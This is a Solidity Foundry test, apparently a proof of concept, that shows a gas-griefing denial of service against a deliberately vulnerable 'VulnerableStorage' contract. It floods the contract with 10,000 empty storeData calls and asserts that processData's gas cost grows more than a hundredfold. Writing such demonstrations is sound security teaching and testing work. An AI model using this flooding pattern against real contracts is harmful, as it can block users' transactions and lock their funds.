// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2,console} from "forge-std/Test.sol";
import {VulnerableStorage} from "../../src/DOS/Gas_griefing.sol";

contract VulnerableStoragePoC is Test {
    VulnerableStorage vulnerable;

    function setUp() public {
        vulnerable = new VulnerableStorage();
    }

    function testGasGriefingVulnerability() public {
        uint256 gasBefore = gasleft();
        vulnerable.processData();
        uint256 gasUsedBefore = gasBefore - gasleft();
        console.log("Gas used before attack: %d ", gasUsedBefore);

        uint256 attackSize = 10000;
        for (uint256 i = 0; i < attackSize; i++) {
            vulnerable.storeData("");
        }

        uint256 gasAfter = gasleft();
        vulnerable.processData();
        uint256 gasUsedAfter = gasAfter - gasleft();
        console.log("Gas used after attack: %d", gasUsedAfter);

        assertGt(gasUsedAfter, gasUsedBefore * 100);
    }
}